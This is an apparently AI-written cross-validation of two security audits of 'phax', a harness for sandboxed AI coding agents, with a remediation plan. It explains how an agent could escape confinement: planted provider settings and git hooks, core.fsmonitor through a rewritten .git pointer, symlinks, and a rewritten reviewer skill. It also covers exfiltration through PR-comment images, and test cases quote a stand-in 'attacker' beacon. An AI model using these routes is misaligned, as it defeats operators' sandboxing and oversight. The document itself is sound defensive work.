# Cross-validation of the 2026-11-23 security audits + remediation roadmap

- **Date:** 2026-11-23
- **Author:** Mistral Vibe, model `mistral-large-4-0`, reasoning effort `high`
- **Inputs:**
  - [2026-11-23-mistral-large-4-0-high-security-report.md](./2026-11-23-mistral-large-4-0-high-security-report.md) ("report A", findings H1, M1-M3, L1-L5)
  - [2026-11-23-opus-high-5.5-security-report.md](./2026-11-23-opus-high-5.5-security-report.md) ("report B", findings SEC-01 to SEC-39)
  - Commit audited by both: `e5c39afa` (v0.43.0)

## 1. Cross-validation method

Report B's headline findings were re-verified independently against the source before being
accepted here: each claim was traced from the cited file/line to the actual code path, and the
repo's own audit (`pnpm audit:security`), `pnpm audit --prod`, and pattern sweeps were re-run.
Provider-behavior claims (how Claude Code merges settings, how Codex sandboxes a `.git` file)
remain *plausible* until probed with the real CLIs, as report B itself marks them.

### 1.1 Report B claims re-verified in code

| Claim | Evidence re-checked | Verdict |
| --- | --- | --- |
| SEC-01: repo `.claude/settings.json` loaded via `--setting-sources project`, never validated, not protected | `src/domain/session/claudeProjectOnly.ts` (repo `.claude/` still loaded); no read/check of the file anywhere in `src/`; `protectedPaths.ts` auto-protects only the loaded `phax.json`; Codex enforcement is commit-check-only | Confirmed in code |
| SEC-02: skeleton records still carry `fix-attempt-*.jsonl`, `handoff-generation.jsonl`, gate logs, `agent-error.log`; in-repo destination allowed on public repos when `transcript:false` | `src/domain/records/assemble.ts` (`PHASE_TRANSCRIPT_FILES = {"output.jsonl"}` only); `src/domain/records/destination.ts:62-66` | Confirmed |
| SEC-03: `phax brief` loads config from a cwd-discovered root; bare-repo fallback loads an agent-written `phax.json`; `Bash(phax brief:*)` is phase-granted | `src/app/loadConfig.ts:417-426` (mainRoot falls back to root when common dir isn't `.git`); `src/cli/definitions/brief.ts` loads config from that root | Confirmed in code |
| SEC-04: `phax resume` re-resolves the security mode from current config; mode not persisted; unsafe banner only in `run.ts` | `resume.ts` passes no `securityMode`; `executePlan.ts:495` falls back to `config.security.profile`; `schemas/status.ts` has no mode field; `UNSAFE_WARNING` only in `run.ts:225,302` | Confirmed |
| SEC-05: Codex MCP recorded as supported/disabled but not enforced | `capabilities.ts` declares `mcpAllowlist: "supported"` for codex-cli; `codexFlags.ts:88-92` admits no MCP flag is emitted | Confirmed |
| SEC-06: phax's `git commit` runs tracked hooks (`core.hooksPath`) | no `--no-verify` / `core.hooksPath` hardening anywhere in `src/infra/git.ts` | Confirmed in code |
| SEC-08: `.phax-context` symlink — writers never `lstat` it; ignore rule `.phax-context/` matches directories only | no `lstat` in `worktree.ts` / `pushedBrief.ts` / `interactiveFiles.ts` / `pullBrief.ts`; rule written with trailing slash (`worktree.ts:164`) | Confirmed |
| SEC-09: review doctrine read from the run worktree's `.claude/skills/phax-review/SKILL.md` | `src/app/reviewCode.ts:409-416` prefers the worktree copy over the bundled skill | Confirmed |
| SEC-10: `gh pr list --head <branch>` matches fork PRs; result recorded as the run's PR | `src/infra/github.ts:129-140`; `src/app/publishRun.ts` records it | Confirmed |
| SEC-11: only @mentions escaped in PR comments; images/HTML pass through | `src/domain/publish/markdownSafe.ts` (`withoutMentions` only), used by `fateComment.ts` | Confirmed |
| SEC-12: lock goes stale on age alone even with a **live** pid; `release` doesn't check ownership | `src/infra/lock.ts:63-73` — pid alive + age > 30 min → `stale/expired` | Confirmed; supersedes A's L2 |
| SEC-07, SEC-13, SEC-14, SEC-17, SEC-21, SEC-24, SEC-25 | consistent with the code read during audit A; git-mechanism ones (SEC-07) plausible as marked | Consistent |

### 1.2 Where the reports differ, and why

- **Threat model.** Report B treats `phax.json` as trusted project configuration (per
  `SECURITY.md`) and does not re-report documented residuals. Report A's **H1** (repo
  `phax.json` controls `security.profile`, additive `allowWrite` with `~` expansion,
  `mcp.allow`, `agentCommands`, and repo gate commands run unsandboxed by phax itself) is
  therefore outside B's scope — B surfaces the narrower, in-model version as SEC-20 (silent
  widening, low). Both views are kept: H1 remains a design-level risk worth a trust gate;
  SEC-20 is the in-scope symptom.
- **The agent-escape class is the main addition of report B** (SEC-01, SEC-03, SEC-06, SEC-07,
  SEC-08, SEC-09): agent-writable files that phax or the provider later *trust*. These work even
  when the repo's `phax.json` is benign, so they are exploitable inside the documented threat
  model. Report A only covered this obliquely via H1.
- **Correction to report A:** A's L2 (lock) understated the bug — the dangerous direction is a
  *live* pid's lock expiring after 30 min (B's SEC-12), not PID reuse. SEC-12 is authoritative.
- **Overlap mapping:** A's M1 = B's SEC-13 + SEC-26 (launcher); A's M2 = B's SEC-34 (env
  inheritance); A's M3 ≈ B's SEC-05/SEC-36 (enforcement labels in `security.json` vs reality).

### 1.3 Verified sound by both audits

Argv-only subprocess execution (no shell strings, no `shell: true`); validated branch/run/plan
identifiers (no leading `-`, no `..`, charset-restricted); `git --` separators on the risky
call sites; atomic writes (temp+rename, mode before content); `wx` locks; schema-decoded config
with unknown-key errors; local-only telemetry; SHA-pinned actions, no `pull_request_target`,
provenance publish; `pnpm audit` clean; no secrets in tracked files or history; the git-level
protected-path check (replace-ref-proof, symlink/nested-repo aware, fails closed).

## 2. Consolidated findings (deduplicated, severity-ranked)

| # | Finding | Sources | Severity |
| --- | --- | --- | --- |
| 1 | Agent-written provider config/hooks trusted later: `.claude/**`, `.codex/**`, `.vibe/**`, `.mcp.json`, nested `phax*.json` | B SEC-01 | High |
| 2 | Skeleton records (`transcript:false`) still publish full agent transcripts, gate logs, error logs; allowed in-repo on public repos | B SEC-02 | High |
| 3 | `phax brief`/`architecture` config discovery loads an agent-written `phax.json` and runs its command | B SEC-03 | High |
| 4 | Repo `phax.json` can downgrade to `unsafe`, add `allowWrite: ["~"]` (operator cannot veto), allowlist arbitrary agent commands, point MCP at repo configs; repo gate/setup commands run unsandboxed by phax | A H1 (+ B SEC-20) | High (design trust gate) |
| 5 | Tracked git hooks (`core.hooksPath`) execute at phax's phase commit | B SEC-06 | High |
| 6 | Worktree `.git` pointer rewrite → agent-chosen git config (`core.fsmonitor`) on phax's git calls | B SEC-07 | High (plausible per provider) |
| 7 | `.phax-context` symlink → phax reads/writes outside the worktree through it | B SEC-08 | High |
| 8 | Review skill read from the reviewed worktree; agent can rewrite the reviewer's instructions | B SEC-09 | High |
| 9 | `phax resume` silently re-resolves security mode from current config; no banner; stale `security.json` | B SEC-04 | Medium-High |
| 10 | Codex MCP policy not enforced but recorded as enforced; `security.json` mislabels several capabilities | B SEC-05, SEC-36; A M3 | Medium |
| 11 | Publish can adopt a fork's PR with the predicted head branch; attacker PR gets comments | B SEC-10 | Medium |
| 12 | Agent text in PR comments keeps images/HTML → exfil beacon via GitHub camo, bypassing network seal | B SEC-11 | Medium |
| 13 | Lock: live pid's lock expires after 30 min; `release`/`renew` don't verify owner; stale-cleanup TOCTOU | B SEC-12 (supersedes A L2) | Medium |
| 14 | npm launcher: cached binary never re-verified; same-release checksum; predictable tmp; unbounded redirects; no timeouts | A M1; B SEC-13, SEC-26 | Medium |
| 15 | Release job runs ~500 devDeps with contents:write + OIDC + Cloudflare token; tag push alone triggers; unsigned macOS binaries | B SEC-14, SEC-27, SEC-39 | Medium |
| 16 | Agent/gate children inherit full env (`GH_TOKEN`, API keys) in secure mode | A M2; B SEC-34 | Medium |
| 17 | Skill-edit grant hook trusts Claude's `if` matcher; directory grants widen | B SEC-15 | Medium (plausible) |
| 18 | Terminal escape injection via agent text (OSC 52 clipboard, faked output) | B SEC-17 | Low-Medium |
| 19 | `phax report` posts cross-project telemetry to a public issue/gist without preview; predictable 0644 files in /tmp | B SEC-21 | Medium |
| 20 | Codex sandbox: `allowRead` unenforced, `/tmp` writable; docs overclaim | B SEC-18 | Low |
| 21 | Handoffs/brief records injected into prompts unfenced; agent-forged brief records copied undecoded | B SEC-22, SEC-23 | Low |
| 22 | ReDoS on agent text; unbounded stdout/gate buffering (OOM) | B SEC-24, SEC-25 | Low (DoS) |
| 23 | State files world-readable (0644 in 0755); Vibe prompt in argv visible via `ps` | B SEC-16 | Low |
| 24 | Audit toolkit fails open (grep `-` pattern bug, suppressed redirect check, ignored exit codes, prod-only deps, skips `npm/bin`) | B SEC-19 | Low (meta) |
| 25 | `child_process` directly in cli/app (boundary breach, not injectable); docs drift; NaN spawn-timeout | A L1, L4, L5 | Low |
| 26 | Misc hardening: literal-pathspec printed commands; push remote before `--`; unescaped `Bash()` rule metachars; destructive targets from state files unchecked; unsigned binaries; unpinned npm-in-release; docs-deploy caller-supplied ref; deno lockfile not frozen | B SEC-28-33, SEC-35, SEC-38, SEC-39, SEC-30-32 | Low/Info |

## 3. Remediation roadmap

Ordered by exploitability and blast radius. Each phase lists the fix and the verification that
proves it. Behavior-dependent items need a probe against the real provider CLI before/after.

### Phase 1 — Stop trusting agent-written files (findings 1, 3, 5, 6, 7, 8)

One coherent change: everything the agent can write must be inert to later phax/provider runs.

- Implicit protected set in every run: `.claude/**`, `CLAUDE.md`, `.codex/**`, `.vibe/**`,
  `.agents/**`, `.mcp.json`, `**/phax.json`, `**/phax.local.json`, the resolved hooks directory,
  and the worktree `.git` pointer. (Extends `protectedList` in
  `src/domain/security/protectedPaths.ts`; note the commit-check already catches changes, the
  gap is that nothing *protects* them today.)
- Harden every worktree git call in `src/infra/git.ts`: explicit `GIT_DIR`/`GIT_WORK_TREE` env,
  `-c core.fsmonitor=false`, and commit with `--no-verify` (or `-c core.hooksPath=/dev/null`).
- `lstat` `.phax-context` and subpaths; refuse anything not a real directory; change the
  ignore rule to `/.phax-context` (no trailing slash); open agent-written files with
  `O_NOFOLLOW` + size cap; decode `brief-NN.json` through its schema before copying.
- Read the review skill from the run's base commit (`git show <base>:…`) or the main checkout,
  never the phase worktree (`reviewCode.ts`).
- Pass the main root to the agent's environment (e.g. `PHAX_MAIN_ROOT`) and make `brief` /
  `architecture` resolve config only from it; refuse when the tree isn't a linked phase
  worktree holding `.phax-context/brief-request.json`.
- **Verify:** unit tests for each refusal; an e2e where a phase commits `.claude/settings.json`
  with `allow: ["Bash"]` + a hook, asserting the next Claude phase does not load it (probe:
  `claude --print` with the planted settings under `--setting-sources project`); git-level test
  that a rewritten `.git` pointer doesn't change phax's git results.

### Phase 2 — Make run state and `security.json` tell the truth (findings 9, 10)

- Persist the effective security mode (or the whole resolved policy) in `run-status.json`;
  `resume` rebuilds from the recorded policy (`policyFromPosture` exists) and refuses/warns on
  drift; print the unsafe banner on resume too; gate `isolated` on resume as on run.
- Codex: emit `-c mcp_servers={}` in secure mode (allowlist: only allowlisted servers), or mark
  the session `mcp-unenforced` and change the capability to `unsupported`; fix the `grep`
  `outside_workdir` gap and `local-only` semantics (SEC-36).
- Record enforcement assumptions honestly in `security.json` (A M3): `enforced` only when the
  native rules are known to cover Write/MultiEdit and compound-command prefixes, else `partial`
  / `commit-check-only`.
- **Verify:** resume-after-config-change test; a Codex run with a planted
  `~/.codex/config.toml` MCP server asserting it is not loaded in secure mode.

### Phase 3 — Records privacy and publish/GitHub hardening (findings 2, 11, 12, 19)

- Build phase records from an **allowlist** (as revision/decision records already are);
  classify `fix-attempt-*.jsonl`, `handoff-generation.jsonl`, `*.vibe-export`, gate logs and
  `agent-error.log` as transcript-class. Add a test listing a full phase folder's contents.
- Consider a security advisory for SEC-02: anyone using records on a public repo with
  `transcript:false` may already have published agent transcripts.
- `findPullRequestForBranch`: query `url,isCrossRepository,headRepositoryOwner,state,headRefOid`;
  accept only a same-repo, open PR whose head SHA equals the pushed commit.
- Render model text as plain text in PR bodies/comments: escape `![ ] < >` or code-span it,
  strip URLs (SEC-11); apply the same to review notes.
- `phax report`: preview + confirm, filter events to the cwd repo, redact, `mkdtemp` 0600 in
  place of predictable `/tmp` files.
- **Verify:** record-content unit test; gh-mocked publish tests for fork/closed PRs; a render
  test with `![](https://attacker/?d=…)` asserting no image survives.

### Phase 4 — Supply chain and release pipeline (findings 14, 15)

- npm launcher: embed the binary SHA-256 digests in the published npm package
  (`prepare-npm.ts`) and verify against those on every run — including the cached binary;
  `mkdtemp` for downloads, verify before chmod/rename, cap redirects (~5) with a host
  allowlist, add timeouts; enable GitHub immutable releases.
- Release workflow: split into build/test (`contents: read`, no `id-token`,
  `persist-credentials: false`) and a minimal attest/publish job that downloads artifacts
  without `pnpm install`; Cloudflare deploy behind a protected `environment:`; tag ruleset +
  `merge-base --is-ancestor` check + tag-signature verification; restrict npm trusted publisher
  to staged publishes; pin `npm@11.16.0` by digest; freeze the Deno lockfile
  (`"lock": {"frozen": true"}`); validate the docs-deploy ref before checkout and use
  `refs/tags/<tag>`.
- **Verify:** launcher test with a tampered cache dir asserting refusal; a release rehearsal
  asserting the publish job never runs install scripts.

### Phase 5 — Config trust gate for repo-supplied security settings (finding 4)

- Treat project-layer security keys as untrusted: per-repo operator confirmation on first use
  (or a `trustedRepos` list in the global overlay); project `allowWrite`/`allowRead` restricted
  to paths inside the repo root (overlays stay additive but scoped); forbid the project layer
  from lowering `security.profile` (operator overlays/CLI may); `mcp.allow` restricted to
  operator-owned paths; warn/mark widening choices (`"/"`, `bash`, `network: open`) in
  `security.json` (SEC-20).
- Run gate/setup/cleanup commands under the same confinement as the agent where the provider
  allows, or at minimum document that they run unsandboxed.
- **Verify:** config-merge tests per layer; a run in a fresh clone asserting the confirmation
  prompt and the refusal to widen.

### Phase 6 — Lock, hygiene, and the audit toolkit (findings 13, 17-26)

- Lock: never stale while the pid is alive (or renew on a timer); owner token checked before
  unlink; keep the EEXIST retry.
- Skill-edit hook: read `tool_input.file_path` from stdin and compare itself (fail closed);
  probe a minimum `claude --version`; refuse directory grants.
- Text hygiene: strip C0/C1 + bidi controls in the renderer (SEC-17); fix the quadratic regexes
  (SEC-24); cap provider/gate stdout buffering with a bounded tail (SEC-25); `0600`/`0700` on
  state root and streams (SEC-16); Vibe prompt via file/stdin.
- Fix the audit toolkit fail-opens (SEC-19: `grep -e`, propagate exit codes, tool error =
  finding, include `npm/bin`, full-tree deps audit) so CI can be trusted to catch regressions.
- Route the four direct `child_process` uses behind ports (A L1); printed restore commands get
  `--literal-pathspecs`; validate the push remote; escape/refuse `(),` in `Bash()` rules;
  root-check destructive targets from state files; doc drift fixes (A L5, B SEC-38).
- **Verify:** lock concurrency test (two processes, one live > 30 min); property tests for the
  regexes; `pnpm audit:security` exit-code tests with a planted fake secret.

### Suggested sequencing

Phase 1 first (it closes the in-model sandbox escapes — the class SECURITY.md explicitly calls a
phax vulnerability), with the SEC-02 advisory considered in parallel; Phase 2 next (run
integrity, cheap); Phases 3-5 in parallel by owner; Phase 6 as hygiene. After each phase, re-run
`pnpm check:full` plus `pnpm audit:security` and add the new refusal/behavior as a test so the
fix cannot silently regress.
